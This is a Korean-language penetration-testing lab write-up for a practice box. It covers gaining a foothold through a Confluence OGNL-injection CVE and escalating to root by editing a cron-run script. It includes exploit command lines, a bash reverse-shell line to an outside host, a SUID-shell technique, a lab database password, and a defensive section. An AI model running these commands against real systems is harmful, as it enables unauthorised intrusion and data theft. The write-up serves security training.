검색어 `searchsploit atlassian 7` / `atlassian 7.` / `atlassian` / `atlassian 7.13.6` 를 네 번 바꿔 가며 친 기록이 남아 있는데, **로컬 DB에 없는 것은 검색어를 아무리 바꿔도 안 나온다.**

![[Pasted image 20260714141017.png]]
![[Pasted image 20260714141213.png]]

### ② `searchsploit jamlink` — 포트 번호표를 검색했다

`~/.zsh_history` 에 남아 있는 명령이다:

```
searchsploit jamlink
```

§1-3에서 확인했듯 `jamlink` 는 `nmap-services` 의 8091 포트 이름이지 제품이 아니고, nmap도 `?` 를 붙여 "식별 실패"라고 말하고 있었다. 결과는 당연히 0건.

**놓친 진짜 단서는 같은 출력 안에 있었다** — `Server: Aleph/0.4.6`. 검색했어야 할 문자열은 `jamlink` 가 아니라 `Aleph` 였다.

**일반화 — nmap 출력에서 검색어를 뽑는 우선순위**
1. **`fingerprint-strings` 안의 `Server:` / 배너 문자열** ← 실측된 것
2. **`http-title`·NSE 스크립트 출력** ← 실측된 것
3. VERSION 열 ← 실측된 것
4. ~~SERVICE 열에 `?` 가 붙은 이름~~ ← **실측이 아니다. 포트 번호로 조회한 표 이름이다**

소요 시간은 1~2분이었지만, 이 습관이 없으면 **없는 제품의 CVE를 30분 찾는다.**

### ③ `--read-file /root/proof.txt` — 무응답을 오독했다

```
python through_the_wire.py --rhost 192.168.103.41 --rport 8090 --lhost 192.168.45.244 --protocol http:// --read-file /root/proof.txt
```

`/etc/passwd` 가 성공한 바로 다음 명령이다. 파일 읽기가 되니 root 플래그도 바로 읽자는 발상인데, **읽기 권한이 없으니 될 리가 없다.**

이 실행의 출력은 남아 있지 않다. 다만 §2-4에서 소스를 직접 읽어 확인한 실행 순서(`readAllBytes()` → `new Socket()`)로부터, 결과가 무엇이었을지는 소스 수준에서 확정할 수 있다: **타겟이 Kali로 연결을 열지 못하므로 리스너에 아무것도 도착하지 않는다.** 배너와 `listening on [any] 1270 ...` 까지는 똑같이 찍히고 거기서 멈춘다.

> [!danger] 이 실패 모드가 왜 위험한가
> 성공했을 때와 **화면이 거의 같다.** 배너도, `[+] Sending expoit at ...` 도, `listening on ...` 도 전부 동일하다. 다른 것은 그 뒤에 아무 줄도 안 붙는다는 것뿐이다.
> 그래서 **"이 익스플로잇은 파일 읽기가 불안정한가 보다"** 로 오독하기 쉽다. 실제 의미는 **"권한이 없다 = 권한상승이 필요하다"** 였다.
>
> 판별법: 읽을 수 있는 게 확실한 파일로 대조군을 세운다. `/etc/passwd` 가 오면 프리미티브는 멀쩡한 것이고, 그 상태에서 목표 파일만 안 오면 **원인은 권한 하나로 좁혀진다.**
>
> 2차 세션에서 정확한 이유가 밝혀졌다 — `/root/proof.txt` 자체는 `0644` 다. 막은 것은 **`/root` 디렉터리의 `0700`** 이다. §5 의 마지막 콜아웃 참조.

### ④ `-rport` — 대시 하나가 빠졌다

```
python through_the_wire.py --rhost 192.168.103.41 -rport 8090 --lhost 192.168.45.244 --protocol http:// --read-file /etc/passwd   ← 실패
python through_the_wire.py --rhost 192.168.103.41 --rport 8090 --lhost 192.168.45.244 --protocol http:// --read-file /etc/passwd  ← 성공
```

`~/.zsh_history` 에 연속된 두 줄로 남아 있다. 같은 파서를 Kali에서 재현해 실제 문구를 확인했다:

```bash
┌──(kali㉿kali)-[/tmp]
└─$ python3 argtest.py --rhost 1.2.3.4 -rport 8090 --lhost 5.6.7.8 --protocol http:// --read-file /etc/passwd
usage: argtest.py [-h] --rhost RHOST [--rport RPORT] --lhost LHOST
                  [--lport LPORT] [--protocol PROTOCOL] [--reverse-shell]
                  [--fork-nc] [--nc-path NCPATH] [--read-file READ_FILE]
argtest.py: error: unrecognized arguments: -rport 8090
exit=2
```

**이 오타가 안전한 종류인 이유 — 그리고 안 그럴 수도 있었던 이유**
`parse_args()` 가 exit 2로 죽는다. `os.fork()` 도 `requests.get()` 도 그 뒤에 있으므로 **패킷이 한 개도 안 나간다.**
만약 argparse가 `-rport` 를 조용히 삼켰다면 `rport` 는 기본값 443이 됐을 것이고, 열려 있지도 않은 포트로 던진 뒤 `[-] The HTTP request failed` 만 보고 **"익스플로잇이 안 통한다"고 오판**했을 것이다. 실제로 그 오판을 유발하는 것이 §2-5의 기본값 함정이다.
**교훈: 익스플로잇이 "실패"하면 먼저 인자가 실제로 파싱됐는지 본다.** 스크립트를 고칠 필요도 없다 — 대부분 `--help` 한 번이면 끝난다.

### ⑤ 51904.py — 제목의 버전 범위에 속았다 (가장 값비싼 오판)

`~/.zsh_history` 에 남은 흐름이다:

```
searchsploit atlassian 7.13.6
searchsploit -m 51904
mv 51904.py ./PG/Flu
python 51904.py
vi 51904.py -u http://192.168.103.41:8090 -c whoami
vi 51904.py
```

`searchsploit` 이 보여준 제목은 **`Atlassian Confluence < 8.5.3 - Remote Code Execution`** 이었다. 7.13.6은 8.5.3보다 작으니 해당된다 — 고 읽은 것이다. Kali의 실제 파일 헤더를 열어 보면 다르다:

```bash
┌──(kali㉿kali)-[~]
└─$ head -8 /usr/share/exploitdb/exploits/multiple/webapps/51904.py
# Exploit Title: CVE-2023-22527: Atlassian Confluence RCE Vulnerability
# Date: 25/1/2024
# Exploit Author: MaanVader
# Vendor Homepage: https://www.atlassian.com/software/confluence
# Software Link: https://www.atlassian.com/software/confluence
# Version:  8.0.x, 8.1.x, 8.2.x, 8.3.x, 8.4.x, 8.5.0-8.5.3
# Tested on: 8.5.3
# CVE : CVE-2023-22527
```

> [!danger] `< 8.5.3` 은 **`8.0 ≤ v ≤ 8.5.3`** 이었다
> 실제 영향 범위는 8.0.x부터다. 7.13.6은 **애초에 대상이 아니다.**
> `searchsploit` 이 보여주는 것은 exploit-db의 제목 문자열이고, 그 제목은 저자가 요약하며 하한을 생략한 것이다.
> **제목은 색인이지 명세가 아니다.** 1분이면 되는 `head -10 <파일>` 로 반증된다.
>
> 이건 [[plum]] 에서 잡힌 것과 같은 실패다(SUID `exim4` → CVE-2019-10149(4.87–4.91)를 준비했으나 타겟은 4.94.2였다). 누적 교훈 8번·9번이 이 박스에서 다시 나온 것이다.

부가로 `vi 51904.py -u ... -c whoami` 는 **`python` 을 칠 자리에 `vi` 를 친 것**이다. vi가 `-u`(vimrc 지정)·`-c`(명령 실행) 를 자기 플래그로 삼켜서 엉뚱한 편집 세션이 열린다. 다음 줄이 그냥 `vi 51904.py` 인 것을 보면 바로 알아채고 나온 듯하다.

### ⑥ 51904를 두 번 받았다 — 그리고 그 이유가 중요하다

```
rm 51904.py                 ← 초반, through_the_wire 클론 직전
...
mv 51904.py ./PG/Flu        ← 후반, 셸을 잡은 뒤
```

같은 파일을 버렸다가 다시 가져왔다. 시점을 보면 이유가 보인다 — 후반의 재시도는 `--read-file /root/proof.txt` 가 실패한(③) 다음이다. 즉 **"권한상승 수단"으로 익스플로잇을 하나 더 찾은 것**이다.

> [!warning] 방향 자체가 틀렸다
> 이미 `confluence` 로 RCE를 가지고 있었다. 같은 웹앱에 두 번째 웹 익스플로잇을 거는 것은 **같은 권한을 다시 얻는 일**이다. 성공해도 여전히 `confluence` 다.
> 필요했던 것은 **로컬 권한상승 열거**(§4-1)였다. `~/.zsh_history` 에 `cd linpeas` 가 한 줄 있는 것으로 보아 linpeas를 떠올리기는 했으나, 타겟에 올려 돌린 흔적은 없다.
>
> **일반화: 셸을 잡은 뒤에 웹 익스플로잇을 더 찾고 있다면 방향을 잘못 잡은 것이다.** 셸이 있으면 무기는 웹이 아니라 `id`·`sudo -l`·`find -perm -4000` 이다.

### ⑦ 시간 배분 — 어디서 손절했어야 하는가

| 구간 | 1차 세션 (2026-07-14) | 2차 세션 (2026-08-20) |
|---|---|---|
| nmap `-p-` | 13:51–13:53 (129초) | 13:48–13:50, 결과 동일 |
| 버전 판정 → 익스플로잇 확보 | 13:53–14:06 (~13분) | 0분 (1차의 클론 재사용) |
| Foothold | 14:06–14:20 (~14분) | ~1분 (같은 명령, IP 만 교체) |
| 권한상승 | 사실상 0분 — 미완 | 04:50–04:54 UTC, 약 5분 |

Foothold까지 30분은 훌륭했다. 1차의 실패는 속도가 아니라 **배분**이었다 — 웹 익스플로잇을 더 찾는 데 쓴 시간을 로컬 열거에 썼어야 했다.

2차 세션의 권한상승이 5분에 끝난 것은 운이 아니라 **순서** 덕이다. 반사 명령 5개를 한 줄로 묶어 한 번에 치고(§4-1), 전부 빈손인 것을 확인한 즉시 `find / -writable` 로 넘어갔다. 도구를 하나도 올리지 않았다.

**시험용 시간 배분으로 옮기면**
- foothold 60분 · 권한상승 60분 · 총 120분에서 손절
- 권한상승 첫 **5분**은 §4-1 의 한 줄짜리 반사 명령에 쓴다. 여기서 끝나는 박스가 실제로 많다
- 다섯 개가 다 빈손이면 **다음 10분은 `find / -writable`·`find / -user root -perm -o+w`·`ps aux`·`ss -lntup`** 이다
- 그래도 없으면 그때 `linpeas` 를 올린다. **순서를 뒤집지 마라** — linpeas 출력 2000줄을 읽는 것보다 `id` 한 줄이 빠르다

### ⑧ 리버스셸이 안 붙었다면 무엇을 의심했을까 (이 박스에서는 한 번에 붙었다)

이 박스는 1270 포트로 즉시 붙었으므로 아래는 **관측된 문제가 아니라 점검 순서**다:

1. **`--lhost` 가 `tun0` IP 인가** — VPN IP는 세션마다 바뀐다. `ip -br a` 로 확인. (Clue에서 실제로 이걸로 태운 시간이 있다 → [[Clue]] §6)
2. **포트 충돌** — 이 스크립트는 `--fork-nc` 를 끌 수 없어 항상 1270을 잡는다(§2-5). 내 리스너가 이미 있으면 충돌한다
3. **아웃바운드 필터** — 1270 같은 비표준 포트가 막히면 `--lport 443`/`80` 으로 내린다
4. **`bash` 부재** — 페이로드가 `bash -c` 를 쓴다. 대상에 bash가 없으면 실패한다. 이 박스는 `/etc/passwd` 에 `root:...:/bin/bash` 가 있어 존재가 확인됐다

### ⑨ 버린 경로 — 8091 Aleph 와 22번 SSH를 왜 안 팠는가

열린 포트가 셋인데 실제로 판 것은 **8090 하나**다. 나머지 둘의 처리를 기록으로 남긴다.

**8091 (Aleph/0.4.6)** — 판단 근거는 nmap 지문 자체에 있다:

| 관측 | 의미 |
|---|---|
| 모든 GET에 `204 No Content` | 본문이 없다. 열거할 표면이 없다 |
| `Access-Control-Allow-Origin: *` · `Allow-Methods: OPTIONS, GET, PUT, POST` | CORS가 활짝 열린 API 엔드포인트. UI가 아니다 |
| `Server: Aleph/0.4.6` | Clojure의 비동기 HTTP 서버 라이브러리. 제품이 아니라 프레임워크 이름이다 |
| 비정상 입력에 `414 Request-URI Too Long` | 자체 파서를 쓰는 커스텀 서비스 |

**즉 경로를 모르면 아무것도 못 한다.** `204` 만 돌려주는 API는 디렉터리 브루트포싱으로도 티가 안 난다 — 존재하는 경로와 없는 경로의 응답이 구분되지 않기 때문이다.
[가정] 이 박스의 설계상 8091은 장식이거나, 권한상승 단계에서 내부 정보를 얻은 뒤에야 의미가 생기는 요소로 보인다. **확인하지 못했다.**

**`204` 만 돌려주는 서비스를 만났을 때**
1. `OPTIONS` 로 허용 메서드를 본다 (여기서는 `PUT`·`POST` 가 열려 있었다 — **쓰기 가능성**)
2. `PUT` 으로 뭔가 올려 본다. CORS가 `*` 인 API는 인증이 없는 경우가 많다
3. 경로 힌트는 **다른 채널**에서 온다 — 8090의 HTML·JS, 설정 파일, 셸을 잡은 뒤의 프로세스 인자

이 박스에서는 3번을 할 기회(셸)가 있었는데도 안 했다. **셸을 잡은 뒤 `netstat -tulpn` 과 `ps aux` 로 8091의 정체를 확인했어야 한다.** [[Clue]] §4-2가 그걸 해서 포트를 5개 더 찾은 사례다.

**22 (OpenSSH 9.0p1)** — 자격증명이 없으니 손댈 것이 없다. 정상 판단이다. 다만 셸을 잡은 뒤에는 이야기가 다르다 — `/home/confluence/.ssh/` 와 `~/.bash_history` 를 봤어야 한다. 그 기록도 없다(§4).

**포트 80이 아예 없다** — 웹 열거의 습관대로 `feroxbuster` 를 80에 돌리려다 없다는 것을 확인하는 데 시간을 쓸 수 있다. `-p-` 결과를 먼저 읽자.

### ⑩ OS 를 SSH 배너로 추정했다가 틀렸다

1차 세션 노트는 상단 요약에 *"Linux (Ubuntu, OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 → 22.04 계열)"* 이라고 적었다. 2차 세션의 `uname -a` 와 `/etc/os-release` 가 반증했다 — **Ubuntu 23.04, kernel 6.2.0-39-generic** 이다.

사실 배너에 답이 이미 있었는데 못 읽은 것이다. Launchpad 에 질의해 확인했다:

```bash
┌──(kali㉿kali)-[~]
└─$ for s in jammy lunar; do echo "== $s"; curl -s "https://api.launchpad.net/1.0/ubuntu/+archive/primary?ws.op=getPublishedSources&source_name=openssh&exact_match=true&distro_series=https://api.launchpad.net/1.0/ubuntu/$s&status=Published" | python3 -c 'import sys,json; d=json.load(sys.stdin); [print(e["source_package_version"], e["pocket"]) for e in d["entries"][:6]]'; done
== jammy
1:8.9p1-3ubuntu0.16 Updates
1:8.9p1-3ubuntu0.16 Security
1:8.9p1-3 Release
== lunar
1:9.0p1-1ubuntu8.7 Updates
1:9.0p1-1ubuntu8.7 Security
1:9.0p1-1ubuntu8 Release
```

**22.04(jammy)는 8.9p1-3ubuntu0.x 이고, 23.04(lunar)가 9.0p1-1ubuntu8.x 다.** 타겟 배너 `9.0p1 Ubuntu 1ubuntu8.5` 는 lunar 계열과 **패키지 리비전까지 정확히 맞는다.** 즉 배너만으로도 23.04 를 특정할 수 있었는데, "9.x 니까 요즘 LTS 겠지"로 건너뛴 것이다.

**교훈은 릴리스 번호를 외우라는 게 아니다.** 배너의 데비안 리비전(`-3ubuntu0.16` / `-1ubuntu8.5`)은 릴리스마다 고유하므로 조회하면 답이 나온다는 것이다. 그리고 셸이 있으면 조회할 필요조차 없다 — `uname -a` 다.

nmap 의 OS 추정도 마찬가지로 빗나갔다 — `Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5` 라고 했는데 실제는 6.2 다. 열린 포트가 3개뿐이라 지문 표본이 빈약했다.

> [!tip] 커널 익스플로잇을 고려한다면 이 오차가 치명적이다
> 5.x 로 알고 5.x 용 PoC 를 골랐으면 그냥 실패한다. **셸을 잡은 뒤에는 추정을 버리고 `uname -a` 로 확정하라.** 1초짜리 명령이다.
> 여기서는 어차피 6.2.0-39(2023-11) 가 당시 최신에 가까워 커널 경로를 팔 이유가 없었다. Ubuntu 23.04 + 6.2 를 보면 GameOver(lay)(CVE-2023-2640/CVE-2023-32629)가 먼저 떠오르지만, 그 패치는 6.2.0-26 에 들어갔으므로 **-39 는 이미 지나 있다.** [가정] — 실제로 시도해 보지는 않았다. 아래 ⑪ 의 경로가 먼저 나왔다.

### ⑪ 표준 열거 5종이 전부 공백이었다 — 그때가 방향을 바꿀 시점이다

`id`(그룹 없음) · `sudo -l`(비밀번호 요구) · SUID(전부 기본) · `getcap`(전부 기본) · 크론(`/etc/cron*` 기본, 개인 crontab 없음). **다섯 개가 연달아 빈손이었다.**

여기서 하기 쉬운 선택 두 가지가 다 나쁘다:

1. **커널 익스플로잇으로 도망간다** — 위 ⑩ 처럼 버전 추정이 틀리면 시간만 태운다. 그리고 PG 박스가 커널 0-day 를 요구하는 경우는 드물다
2. 같은 열거를 도구를 바꿔 반복한다(linpeas 를 올린다) — 나쁘지 않지만, 이 박스에서는 **손으로 친 `find / -writable` 한 줄이 답이었다.** 도구를 올리는 데 드는 시간(다운로드·전송·실행·출력 읽기)이 더 길었을 것이다

실제로 통한 것은 **질문을 바꾸는 것**이었다. "나에게 무슨 권한이 있는가"(`id`·`sudo -l`·SUID·capabilities)를 다섯 번 물어 다 빈손이었으면, 다음 질문은 **"내가 건드릴 수 있는 *남의* 것이 무엇인가"** 다. 그게 `find / -writable` 이고, `find / -group $(id -gn)` 이고, `find / -user root -perm -o+w` 다.

**이 전환의 일반형**
| 1라운드 질문 | 2라운드 질문 |
|---|---|
| 나는 무엇을 실행할 수 있나 (`sudo -l`·SUID·capabilities) | 나는 무엇을 쓸 수 있나 (`find / -writable`) |
| 나는 어느 그룹인가 (`id`) | 누가 내 것을 실행하나 (root cron·systemd·서비스 유닛) |
| 어떤 크론이 보이나 (`/etc/cron*`) | 크론이 안 보이는데도 도는 증거가 있나 (`pspy`, 남의 홈에 쓰는 내 소유 스크립트, mtime 이 방금인 파일) |

Flu 는 2라운드 첫 줄에서 끝났다. **1라운드가 다섯 번 빈손이면 그건 실패가 아니라 신호다.**

### ⑫ 크론이 "없다"고 결론 낼 뻔했다

§4-1 에서 `/etc/crontab`·`/etc/cron.d/`·`/etc/cron.hourly/` 를 다 봤고 `crontab -l` 은 `no crontab for confluence` 였다. **관측만 놓고 보면 "이 박스에 사용자 크론은 없다"** 가 자연스러운 결론이다.

틀렸다. root 개인 crontab 에 `*/1 * * * * /opt/log-backup.sh` 가 있었다(§4-4). `/var/spool/cron/crontabs` 는 `drwx-wx--T` 라 **저권한 사용자는 목록조차 못 본다.**

> [!danger] 저권한에서 크론은 원리적으로 부분 관측이다
> 볼 수 있는 것: `/etc/crontab`, `/etc/cron.d/*`, `/etc/cron.{hourly,daily,weekly,monthly}/*`, 자기 자신의 `crontab -l`
> 볼 수 없는 것: **다른 사용자의 개인 crontab 전부**, systemd 타이머의 일부 유닛 내용
>
> 그래서 "크론 없음"은 **결론이 아니라 관측 한계**다. 간접 증거로 넘어가야 한다:
> - `ls -la --time-style=full-iso` 로 **mtime 이 방금인 파일** — 뭔가 주기적으로 돈다는 뜻이다
> - `pspy` 로 프로세스 생성 감시 (root 권한 없이도 `/proc` 폴링으로 잡는다)
> - **남의 디렉터리에 쓰는데 내가 소유한 스크립트** ← 이 박스의 답
> - `/var/log/syslog` 의 `CRON[...]` 줄 (읽을 수 있다면)

---

## 7. OSCP 시험 관점

1. **`${...}` 를 만나면 표현식 주입을 의심한다.** OGNL(Confluence·Struts2)·SpEL·Freemarker·Velocity·Jinja2가 전부 한 가족이다. **`${7*7}` → `49` 가 판별 프로브다.**
2. **`.action` / `.do` 확장자는 Struts2·WebWork 신호다.** nmap의 `Requested resource was /login.action?...` 한 줄이 이 박스의 방향을 정했다.
3. **`?` 가 붙은 nmap SERVICE 이름을 제품으로 착각하지 마라.** 그건 포트 번호표다. 검색어는 `fingerprint-strings` 의 배너에서 뽑는다.
4. **searchsploit 제목의 버전 범위를 믿지 말고 파일 헤더를 열어라.** `head -10` 이면 된다. "`< 8.5.3`" 이 실제로는 "`8.0 ≤ v ≤ 8.5.3`" 이었다.
5. **`searchsploit` 이 비면 검색어가 아니라 채널을 바꿔라.** CVE 번호를 쥐었으면 GitHub이 다음 수다.
6. **리버스셸 전에 조용한 프리미티브로 RCE를 먼저 증명하라.** 파일 읽기가 되면 남은 변수는 네트워크뿐이라 원인 분리가 된다.
7. **파일 읽기 프리미티브는 권한 경계를 못 넘는다.** `/root/*` 를 읽으려는 시도는 권한상승의 대체재가 아니다.
8. **"아무것도 안 왔다" ≠ "파일이 없다".** 예외가 나면 침묵한다. 읽을 수 있는 게 확실한 파일로 대조군을 세워 원인을 좁혀라.
9. **익스플로잇이 주는 권한 = 서비스 실행 계정.** 셸을 잡은 순간 `id` 부터 친다. 웹 익스플로잇을 하나 더 찾고 있다면 방향이 틀린 것이다.
10. **셸을 잡자마자 칠 5개**: `id` · `sudo -l` · `find / -perm -4000 -type f 2>/dev/null` · `getcap -r / 2>/dev/null` · `cat /etc/crontab`
11. **자동 도구 없이 같은 결과를 얻는 법** — 이 박스는 자동 익스플로잇 도구를 쓰지 않았다. PoC 스크립트는 시험 허용이고, 굳이 손으로 하려면 `curl --path-as-is` 로 URL 인코딩한 OGNL 페이로드를 경로에 붙여 보내면 된다(닫는 `/` 를 잊지 말 것).
12. **`local.txt` 를 얻었다고 박스가 끝난 게 아니다.** 1차 세션은 여기서 멈춰 1/2 로 남았다. 시험이라면 절반 점수다.
13. **반사 5종이 다 비면 질문을 바꾼다.** "내가 무엇을 할 수 있나" → **"내가 무엇을 쓸 수 있나"**. `find / -writable -not -path ...` 한 줄이 이 박스의 답이었다(§6-⑪).
14. **남의 디렉터리에 쓰는 스크립트는 그 사용자로 실행된다.** `BACKUP_DIR="/root/backup"` 한 줄이 "root cron" 이라는 뜻이다. 실행 주체를 코드에서 역산하라.
15. **`/etc/cron*` 이 비어도 크론이 없는 게 아니다.** 다른 사용자의 개인 crontab 은 `0600`, 스풀 디렉터리는 `drwx-wx--T` 라 **원리적으로 안 보인다**(§6-⑫).
16. **SUID 셸을 만들면 `-p` 를 붙여 실행하라.** bash 는 `euid != uid` 를 감지하면 스스로 특권을 버린다. `-p` 가 없으면 SUID 가 붙어 있어도 평범한 셸이 나온다.
17. **파일 모드만 보고 읽을 수 있다고 판단하지 마라.** 이 박스의 `/root/proof.txt` 는 `0644` 였는데도 못 읽었다 — 막은 것은 `/root` 디렉터리의 `0700` 이다. 경로 위 모든 디렉터리에 `x` 가 필요하다.
18. **셸을 잡으면 추정을 실측으로 교체하라.** SSH 배너로 22.04 라고 추정했던 것이 실제로는 23.04 였고, nmap 의 커널 추정 5.x 는 실제 6.2 였다. `uname -a` 한 줄이면 끝난다(§6-⑩).
19. **PG 는 리버트마다 플래그 값을 새로 만든다.** 적어 두고 나중에 제출할 계획은 리버트 한 번에 무효가 된다.

---

## 8. 방어 관점

- **패치가 유일한 근본 대책이다.** CVE-2022-26134는 Confluence 7.4.17 / 7.13.7 / 7.14.3 / 7.15.2 / 7.16.4 / 7.17.4 / 7.18.1 에서 수정됐다. 타겟의 **7.13.6은 7.13.7 바로 직전**이다 — 마이너 하나 차이로 열려 있었다.
- **서비스 계정 최소권한** — Confluence를 전용 `confluence` 계정으로 돌린 것 자체는 잘 한 설정이다. 그 덕에 RCE가 즉시 root가 되지 않았다.
- **아웃바운드 이그레스 필터링** — 이 익스플로잇은 타겟이 밖으로 TCP를 열어야 성립한다(리버스셸이든 파일 읽기든). 서버가 임의 목적지로 나가지 못하게 막으면 RCE가 나도 데이터가 안 빠진다.
- **관리 인터페이스를 인터넷에 두지 않기** — 8090을 VPN/내부망 뒤에 두었으면 미인증 결함의 노출면 자체가 없다.
- **탐지** — 액세스 로그의 URI에 `%24%7B`(= `${`) 나 `Class.forName` 이 보이면 그대로 침해 지표다. 경로 세그먼트가 비정상적으로 긴 요청도 마찬가지다.

**권한상승 쪽은 원인이 하나다 — 파일 소유권이다.**

- `/opt/log-backup.sh` 가 `confluence:confluence` 소유였다. root cron 이 실행하는 스크립트를 저권한 계정이 쓸 수 있으면 그 자체로 root 다. `root:root 0755` 였으면 이 경로는 존재하지 않는다. **"root 가 실행하는 것은 root 만 쓸 수 있어야 한다"** 가 규칙이다.
- 스크립트 안의 변수도 전부 **따옴표가 없다**(`cp -r $LOG_DIR $BACKUP_DIR/...`). 이 박스에서는 경로에 공백이 없어 문제가 안 됐지만, 로그 파일명을 공격자가 정할 수 있으면 별개의 주입면이 된다.
- **`sudo -l` 을 비밀번호 뒤에 둔 것은 잘 한 설정이다.** 서비스 계정에 `NOPASSWD` 를 주면 여기서 바로 끝났다.
- Confluence DB 비밀번호가 평문으로 `confluence.cfg.xml` 에 있다. Atlassian 설계상 불가피한 면이 있지만, **그 비밀번호를 OS 계정과 공유하지 않는 것**이 최소한의 방어다. 이 박스는 그 점은 지켰다 — `HoldingOn12` 는 DB 전용이었다.

---

## 9. 참고 자료

- CVE-2022-26134 — Atlassian Confluence OGNL injection (미인증 RCE)
- 벤더 어드바이저리: https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html
- 사용한 PoC: https://github.com/jbaines-r7/through_the_wire (Jacob Baines / Rapid7). 클론본: `~/PG/Flu/through_the_wire/`
- 막다른 길이었던 익스플로잇: EDB 51904 = CVE-2023-22527 (Confluence 8.0.x–8.5.3, `/template/aui/text-inline.vm`) — **7.13.6에는 해당 없음**
- OGNL 명세(Apache Commons OGNL) — 표현식 언어의 메서드 호출 능력
- `nmap-services` (포트↔이름 표): `/usr/share/nmap/nmap-services`
- OSCP Exam Guide, "Exam Proofs" (웹셸 금지 조항): https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide

---

## 남긴 흔적 (랩 정리용)

**되돌린 것 — 실행 결과로 확인함:**

- `/opt/log-backup.sh` — 페이로드 한 줄을 붙였다가 **원본(`/tmp/.lb.orig` 백업)으로 복원했다.** 복원 후 `tail -3` 이 원본 마지막 줄(`find $BACKUP_DIR ... \;`)로 끝나는 것을 확인했다.
- `/tmp/rootbash` (SUID bash) — **삭제 확인.** 복원 뒤 `ls -la /tmp/` 에 없다.
- `/tmp/.lb.orig` (백업본) — **삭제 확인.** 같은 `ls` 출력에 없다.
- Kali `tmux` 세션 `flunmap` — `tmux kill-session -t flunmap` 으로 종료 확인.

**남아 있는 것:**

- **리버스셸 프로세스** — `confluence` 로 `bash -c bash -i >& /dev/tcp/192.168.45.207/1270` 와 그 자식들. 여기서 root 셸까지 올라갔으므로 프로세스 트리가 살아 있다. **플래그 재확인을 위해 의도적으로 살려 뒀다.** 확인 후 종료 예정이며, 리버트하면 소멸한다.
- **Kali `tmux` 세션 `flushell`** — 위 셸을 담고 있다. 같은 이유로 남겼다.
- `/root/backup/log_backup_*` — 이건 **박스 자신의 크론이 1분마다 만드는 것**이지 내가 만든 것이 아니다. 스크립트의 `-mmin +5` 가 알아서 지운다.

**획득 자격증명** — Confluence DB: `confluence` / `HoldingOn12` (MySQL, localhost 전용). Confluence 웹 admin 해시 `{PKCS5S2}MCB0MaBA39Gj...` — 크랙하지 않았다.

**타겟에 업로드한 파일 없음.** linpeas 를 포함해 어떤 도구도 올리지 않았다. 쓴 것은 위 두 개(`/tmp/rootbash`·`/tmp/.lb.orig`)뿐이고 둘 다 지웠다.

## 관련 노트

- [[_WRITEUP-STANDARD]] — 이 노트의 작성 기준
- [[_STATUS]] — 2026-08-20 부로 **완료(2/2)**
- [[Astronaut]] · [[Exfiltrated]] · [[Muddy]] · [[Zipper]] — 같은 권한상승 유형(**크론이 도는 스크립트/경로를 저권한이 건드린다**). Flu 는 그중 가장 단순한 형태다 — 스크립트 파일 자체를 쓸 수 있었다
- [[Clue]] — 같은 계열의 교훈이 가장 많은 박스. 공개 PoC를 손으로 고쳐 쓰는 법, 리버스셸 `lhost` 오지정, exploit 헤더의 거짓 주석
- [[plum]] — 누적 패턴 **"익스플로잇 전에 버전 범위를 대조하라"**. 이 박스의 §6-⑤와 같은 실패
- [[Squid]] · [[Exfiltrated]] · [[Hawat]] — 누적 패턴 "인용이 깨지면 인코딩으로 도망간다". §2-3의 `bash -c` 래핑이 같은 계열
- [[Crane]] · [[RubyDome]] · [[Astronaut]] · [[Exghost]] · [[Squid]] — 누적 패턴 "응답이 성공을 뜻하지 않는다". §2-4·§6-③은 그 거울상(무응답도 실패를 뜻하지 않는다)
- [[Hub]] · [[Levram]] — 누적 패턴 "버전 판정은 독립 근거 2개". §1-2가 그 실행
- [[Butch]] — ⚠️ 웹셸로 얻은 플래그는 OSCP에서 0점. 증거 스크린샷 형식
- [[Jacko]] — Flu 가 오래 머물렀던 **부분 완료(1/2)** 상태에 여전히 있는 박스. Windows 쪽에서 공개 익스플로잇으로 Foothold 를 잡고 `proof.txt` 를 못 얻었다. 그쪽 §6 은 "리버스셸이 안 붙을 때 무엇부터 의심하는가"가 주제다
